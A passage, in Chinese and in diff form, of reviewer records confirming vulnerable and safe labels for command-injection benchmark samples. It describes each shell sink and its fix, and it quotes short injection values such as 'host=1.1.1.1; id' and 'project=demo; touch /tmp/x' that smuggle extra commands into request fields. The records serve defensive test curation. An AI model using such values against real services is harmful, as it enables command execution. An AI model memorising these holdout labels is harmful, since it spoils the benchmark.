+证据文件：证据\03_源码关键片段.txt
+待确认问题：参数注入残余风险建议单列，不构成本样例标签分歧
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-15-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：feac10f34f1d4dbccea645962989636407c9b8969d00aef8f42455502aeabda5
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 10-11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：GET /trace 的查询参数 host。
+输入经过的处理过程：第 10 行取 host；第 11 行 await asyncio.create_subprocess_shell(f"traceroute -m 8 {host}", ...)。
+最终输出位置或危险操作：第 11 行 create_subprocess_shell 的 shell 命令。
+已有防护及其适用范围：无。create_subprocess_shell 与 subprocess(shell=True) 等价；f-string 不引用。
+
+判断理由：host="1.1.1.1; id" 会在 traceroute 后执行命令；异步 API 不改变 shell 语义。
+lines=[10,11]、anchor 在 11 行，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 10-11 行（取值在 10，执行在 11）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-15-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：8d2514d7045f908d5764bddad6a3237215240564859e17fbcae1a0a47ba08176
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-15-V 的 host。
+输入经过的处理过程：第 11 行改为
+asyncio.create_subprocess_exec("traceroute", "-m", "8", "--", host, stdout=PIPE)，无 shell。
+最终输出位置或危险操作：同一 traceroute 调用，但直接 exec。
+已有防护及其适用范围：create_subprocess_exec 不经过 shell；host 是单个 argv；"--" 终止选项。
+
+判断理由：host 中的 shell 元字符不再有特殊含义；仍能正常执行 traceroute。
+原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-16-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：7d81da560b8b0815674a571b9d4bca0b91c0fbfa3602ed7c979878b1cc242016
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 7-13 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：POST /notify 的表单字段 subject、email。
+输入经过的处理过程：第 7 行常量模板 MAIL = "echo '...' | mail -s '$subject' $address"；
+第 12 行 MAIL.substitute(subject=..., address=...) 得到命令串；第 13 行 os.system(command)。
+最终输出位置或危险操作：第 13 行 os.system 的 shell 命令。
+已有防护及其适用范围：无。string.Template 只做变量替换，不做 shell 引用；subject 位于单引号内、
+address 完全裸露，两者都可突破。
+
+判断理由：subject="'; id; '" 或 address="x; id" 都能追加命令；模板替换不是安全边界。
+lines=[7,13] 覆盖模板与执行，anchor 在 12 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 7-13 行（模板 7，替换 12，执行 13）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-16-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：5180777b6a164a48278625080f39dbbcdc7d3395c7ba0e8c23cd8620f4cb2220
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-16-V 的 subject、email。
+输入经过的处理过程：第 10 行 args = ["mail", "-s", subject, "--", email]；
+第 11 行 subprocess.run(args, input="Your report is ready\n", text=True)，无 shell、无 os.system。
+最终输出位置或危险操作：直接 exec mail，正文通过 stdin 传入。
+已有防护及其适用范围：argv 列表使两个字段都只作为参数；"--" 终止选项，避免 email 被当成 mail 选项。
+
+判断理由：subject/email 中的 shell 元字符不再被解释；原来 echo|mail 的管道由 stdin 正确替代。
+原标签 safe 成立，业务（发通知）保持。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-17-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：2adc7ae4d25b316d9def33be5617083b6072ca166a6b8eb9762cbef67b70a695
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 12-13 行（anchor 位于第 13 行）
+
+主审结论：agree
+
+输入来源：GET /archives 的查询参数 name（传给 Archiver.list_entries 的 archive）。
+输入经过的处理过程：视图第 264 行把 request.args.get("name","") 传入类方法；
+第 13 行 subprocess.Popen(f"unzip -l {self.root}/{archive}", shell=True)。
+最终输出位置或危险操作：第 13 行 Popen(shell=True) 的 unzip 命令。
+已有防护及其适用范围：无。类封装、实例属性拼接都不提供转义。
+
+判断理由：archive="x; id" 会执行额外命令；也可用 $(...) 或反引号。lines=[12,13]、
+anchor 在 13 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 12-13 行（方法 12，执行 13）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-17-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：342665b24967140c880e64e19aab4e4192afc94e71e1492ed1a9059c09a4cc6a
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-17-V 的 name。
+输入经过的处理过程：第 13 行 subprocess.Popen(["unzip", "-l", f"{self.root}/{archive}"], stdout=PIPE)，无 shell。
+最终输出位置或危险操作：同一 unzip 调用，参数为单个 argv。
+已有防护及其适用范围：argv 列表；archive 中的 shell 元字符不会被解释。
+
+判断理由：unzip 直接接收一个路径参数，命令结构固定；业务上仍列出压缩包内容。
+原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：路径穿越（../）仍可列出任意目录下的压缩包（非 CWE-78），建议单列
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-18-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：747c90decbe6d7d7f983897a2292d5710c4c9fdea9c6ddc77f9334c49872e523
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11-12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：POST /healthcheck 的 JSON 数组 hosts 的每个元素。
+输入经过的处理过程：第 10 行 results = {}；第 11 行 for host in ...["hosts"]；
+第 12 行 results[host] = os.system(f"curl -fsS --max-time 3 http://{host}/health")。
+最终输出位置或危险操作：第 12 行 os.system 的 curl 命令（循环内逐个执行）。
+已有防护及其适用范围：无。列表元素逐个拼进 shell 命令，循环不提供任何隔离。
+
+判断理由：host="x; id" 或 "$(id)" 会执行命令；URL 前缀 http:// 不能阻止分号/替换。
+lines=[11,12]、anchor 在 12 行，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11-12 行（循环 11，执行 12）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-18-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：f90e296ecf131074b3691233a042911d2a76ea462e8d952366a3b73cb54d1f73
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-18-V 的 hosts 列表。
+输入经过的处理过程：第 12 行 command = ["curl", "-fsS", "--max-time", "3", f"http://{host}/health"]；
+第 13 行 subprocess.run(command, capture_output=True).returncode，循环结构保留。
+最终输出位置或危险操作：同一 curl 调用，但 argv 列表、无 shell。
+已有防护及其适用范围：argv 列表；host 只出现在 URL 字符串里，作为单个参数，不被 shell 解释。
+
+判断理由：循环中的每个 host 都只作为参数，命令结构固定；业务上仍返回每个 host 的退出码。
+原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：URL 主机名校验缺失（可访问任意内网地址，SSRF 类风险），不属于 CWE-78
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-19-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：64afcf667725c859bbffec9eda612b95e90b5f7e369f52b8e36fda969a638c72
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11-15 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：GET /convert-audio 的查询参数 src、format。
+输入经过的处理过程：第 11-14 行按 format 分支选择命令字符串：
+"ffmpeg -y -i %s output.mp3" % source 或 output.ogg；第 15 行 subprocess.call(command, shell=True)。
+最终输出位置或危险操作：第 15 行 shell=True 的 ffmpeg 命令。
+已有防护及其适用范围：无。分支只决定输出扩展名，source 在每个分支都直接格式化进命令。
+
+判断理由：source="x; id" 会在转码命令中注入；分支汇合到同一个 shell 调用，不影响注入。
+lines=[11,15] 覆盖分支与执行，anchor 在 12 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11-15 行（分支 11-14，执行 15）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-19-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：e3a79cdda51f5b7b7a7947bdfc7478c956549fdfc2ec0b9181e56452e0de396d
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-19-V 的 src、format。
+输入经过的处理过程：第 12-15 行分支改为 argv 列表
+["ffmpeg", "-y", "-i", source, "output.mp3"/"output.ogg"]；
+第 16 行 subprocess.call(shlex.join(command), shell=True)。
+最终输出位置或危险操作：仍然是 shell=True，但传给 shell 的字符串已由 shlex.join 正确引用。
+已有防护及其适用范围：shlex.join 对每个 argv 做 shell 引用；source 只能是单个词，
+分号/管道/$() 都会被转义或加引号。
+
+判断理由：虽然保留了 shell，但引用是完整的，命令结构不可被 source 改变；业务命令不变。
+原标签 safe 成立。注意：这是一种"保留 shell 但正确引用"的安全实现，不是"没有 shell"。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-20-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：12c6ed121e60b8fa7fc7039cafdfb1cf11ae65a3746f4489ee35f2ac6a14a55c
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11-12 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：POST /build 的表单字段 project。
+输入经过的处理过程：第 11 行 script = "cd /srv/projects/" + project + " && make release"；
+第 12 行 subprocess.run(script, shell=True)。
+最终输出位置或危险操作：第 12 行 shell 执行的 "cd ... && make" 组合命令。
+已有防护及其适用范围：无。project 既可能含 shell 元字符（; | $()），也可能用 ../ 切出项目目录。
+
+判断理由：project="demo; touch /tmp/x" 会在 cd 后执行 touch；"../x && id" 可跳出目录再执行命令。
+lines=[11,12]、anchor 在 11 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11-12 行（拼接在 11，执行在 12）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-20-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：05116a5358e4652b682edb4bb4f893b8bca0c6c5048d980bcbcd95c28f5c9ff8
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-20-V 的 project。
+输入经过的处理过程：第 12 行 project = PROJECTS / request.form["project"]；
+第 13 行 if project.resolve().parent != PROJECTS: abort(400)；
+第 15 行 subprocess.run(["make", "release"], cwd=project)，无 shell。
+最终输出位置或危险操作：同一 make 调用，但用 cwd= 参数切换目录，不再拼 "cd &&"。
+已有防护及其适用范围：argv 列表消除 shell 解释；cwd 参数承担目录切换；路径父目录检查限制
+project 不能跳出 /srv/projects（含斜杠或 ../ 的输入会 400）。
+
+判断理由：project 只影响 cwd，不进入命令行文本；metacharacters 无法被解释。
+原标签 safe 成立，业务上仍在指定项目目录执行 make release。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：不存在的项目目录会触发 FileNotFoundError（500），属错误处理问题；
+已由项目"修复业务约束（处理 OSError）"要求覆盖，不影响 safe 标签
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+====================================================================
+六、开发集命令注入源码（samples/dev/source/cmdi.bundle.txt，8 族 16 条）
+====================================================================
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-01-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：235747faad93d2b671c063c28b94befdd29bd4caff4e904bf1a9ec52abf57e4a
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：GET /ping 的查询参数 host。
+输入经过的处理过程：第 10 行取 host；第 11 行 os.system(f"ping -c 1 {host}")。
+最终输出位置或危险操作：第 11 行 os.system，固定经 shell。
+已有防护及其适用范围：无。f-string 不做 shell 引用。
+
+判断理由：host="127.0.0.1; id" 会在 ping 后执行 id；os.system 总是调用 shell。
+lines=[11,11]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-01-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：32511dc8acdb9dc98ba87bca2c553a9a936b63da3b465b2494723ebf661ba165
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-01-V 的 host。
+输入经过的处理过程：第 11 行 subprocess.run(["ping", "-c", "1", "--", host], capture_output=True, timeout=5)。
+最终输出位置或危险操作：直接 exec ping，无 shell。
+已有防护及其适用范围：argv 列表 + 默认 shell=False；"--" 终止选项，host 不能以 - 开头当作 ping 选项。
+
+判断理由：host 只作为单个参数，分号/管道/反引号无特殊含义；业务上仍返回可达性。
+原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-02-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：6be877e248f22e6c6bbf1b5210e0a35dea6ab8a11bfbd208e9a219b598a1042a
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：GET /whois 的查询参数 domain。
+输入经过的处理过程：第 11 行 os.popen("whois " + domain).read()，字符串拼接后经 shell 执行。
+最终输出位置或危险操作：第 11 行 os.popen。
+已有防护及其适用范围：无。os.popen 是 shell 接口，拼接未引用。
+
+判断理由：domain="example.com; id" 可注入；即使没有 shell=True 参数，popen 也调用 shell。
+lines=[11,11]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-02-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：f5a07ea3f76a46e9824f30d257fd5c3c6d06dc5ecad7b6e85169168a30599726
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-02-V 的 domain。
+输入经过的处理过程：第 11 行 os.popen("whois " + shlex.quote(domain)).read()。
+最终输出位置或危险操作：同一 os.popen（仍经 shell），但参数被引用。
+已有防护及其适用范围：shlex.quote 生成单个 shell 词；domain 中的 ; | $() 反引号都会被转义/包围。
+适用于"保留 shell"的实现。
+
+判断理由：命令结构固定为 whois '<data>'，domain 无法追加命令；业务输出不变。
+原标签 safe 成立，且演示了"不改成 argv 也能安全"的合法修法。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-03-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：a4b948fb52d765b0e3d17a52cb491f033d10621578831b928dac1e5c2262445e
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11-12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：POST /archive 的表单字段 folder。
+输入经过的处理过程：第 11 行 cmd = "tar -czf /tmp/backup.tgz {}".format(folder)；
+第 12 行 subprocess.run(cmd, shell=True, check=True)。
+最终输出位置或危险操作：第 12 行 shell=True 的 tar 命令。
+已有防护及其适用范围：无。format 不引用，folder 可含 ; | $() 或 ../。
+
+判断理由：folder="x; id" 执行额外命令；folder="../.." 也能改变打包目录。
+lines=[11,12]、anchor 在 12 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11-12 行（拼接在 11，执行在 12）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-03-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：f8e090d3d9bc282e84248ff1f03b7527cfc519ac8da5993e586c02ab27671e6d
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-03-V 的 folder。
+输入经过的处理过程：第 12 行 folder = (BASE / folder).resolve()；
+第 13 行 if BASE not in folder.parents: abort(400)；
+第 15 行 subprocess.run(["tar", "-czf", "/tmp/backup.tgz", str(folder)], check=True)，无 shell。
+最终输出位置或危险操作：同一 tar 调用，但 argv 列表 + 解析后的路径。
+已有防护及其适用范围：argv 消除 shell 解释；resolve + parents 检查阻止跳出 BASE（含绝对路径与 ../）。
+
+判断理由：folder 只作为 tar 的路径参数；路径检查防止打包任意目录。原标签 safe 成立，
+业务上仍生成归档。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：符号链接竞争（TOCTOU）在真实文件系统中仍可能绕过路径检查，属实现限制，
+不影响本样例的 CWE-78 安全判定
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-04-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：56a3c52723593f01663bce951ff8ef0127daa76d9d0eb2e739d18eb264fb7ee1
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：GET /convert 的查询参数 file。
+输入经过的处理过程：第 11 行 sp.call("libreoffice --headless --convert-to pdf uploads/" + name + ".docx", shell=True)。
+最终输出位置或危险操作：第 11 行 shell=True 的 libreoffice 命令（模块以 sp 别名导入）。
+已有防护及其适用范围：无。别名导入不改变 shell=True 语义；name 直接拼接。
+
+判断理由：name="x; id" 可注入；module 别名也不影响 sink 识别。lines=[11,11]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-04-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：b8b6666670c63d82f967434163146393f03dde90e53bf245321c8e068580e92d
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-04-V 的 file。
+输入经过的处理过程：第 11 行 sp.call(["libreoffice", "--headless", "--convert-to", "pdf", f"uploads/{name}.docx"])，
+无 shell。
+最终输出位置或危险操作：同一 libreoffice 调用，argv 列表。
+已有防护及其适用范围：argv 列表 + 默认 shell=False；name 只作为路径的一部分，不被 shell 解释。
+
+判断理由：name 中的 ; | $() 无特殊含义；业务仍生成 PDF。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：name 中的 ../ 仍可影响读取文件（路径问题，非 CWE-78）
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-05-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：bf7c288462f3fae4db19c7a90a77c9c86a5968bde06d4d22cb6682a6d5a066a4
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：POST /service 的表单字段 action。
+输入经过的处理过程：第 10 行 action = request.form.get("action","status")；
+第 11 行 code = system("systemctl " + action + " nginx")（system 由 from os import system 引入）。
+最终输出位置或危险操作：第 11 行 os.system 的 systemctl 命令。
+已有防护及其适用范围：无。from 导入的裸名 system 仍是 os.system；action 拼接未引用。
+
+判断理由：action="status; id" 可注入；"status nginx; id" 同理。lines=[11,11]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-05-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：bf6d57753ff2bd85f2c3764aadc67bf1eee35c5a3efef7ac89ec27dd7a9ca231
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-05-V 的 action。
+输入经过的处理过程：第 6 行常量字典
+ACTIONS = {"status": "systemctl status nginx", "reload": "systemctl reload nginx"}；
+第 11 行 command = ACTIONS.get(action, "systemctl status nginx")；第 12 行 system(command)。
+最终输出位置或危险操作：仍是 os.system，但命令串只能来自常量。
+已有防护及其适用范围：命令白名单：用户值只作为查表键，未命中回退到常量；没有任何用户文本进入命令。
+
+判断理由：action 无法改变命令行；system 仍是 shell 接口，但输入是常量。原标签 safe 成立，
+业务上仍能 status/reload。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-06-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：96746017dd963767d44823ac6edc499d24bf484d6b391cfdf5cdaeb475e6ee4a
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 9-15 行（anchor 位于第 9 行）
+
+主审结论：agree
+
+输入来源：GET /logs 的查询参数 q、file。
+输入经过的处理过程：第 9 行 helper build_grep 返回 "grep -n '" + pattern + "' /var/log/app/" + logfile；
+第 15 行 subprocess.check_output(cmd, shell=True, text=True)。
+最终输出位置或危险操作：第 15 行 shell=True 的 grep 命令。
+已有防护及其适用范围：无。pattern 位于单引号内可跳出；logfile 完全裸露，可含 ; | $()。
+
+判断理由：q="' ; id ; '" 或 file="x; id" 均可注入；helper 只拼接不校验。
+lines=[9,15] 覆盖 helper 与执行，anchor 在 9 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 9-15 行（拼接在 9，执行在 15）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-06-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：8cc8221aadd9f1cda67f11e8636f2e9b0d3e5ea0f570b2233ca00733eeaef92f
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-06-V 的 q、file。
+输入经过的处理过程：第 9 行 helper 返回
+["grep", "-n", "--", pattern, "/var/log/app/" + logfile.replace("/", "")]；
+第 15 行 check_output(cmd, text=True)，无 shell。
+最终输出位置或危险操作：直接 exec grep。
+已有防护及其适用范围：argv 列表 + "--" 终止选项；pattern 作为单个参数，即使以 - 开头也不会被当选项；
+logfile 去掉 / 防止目录穿越。
+
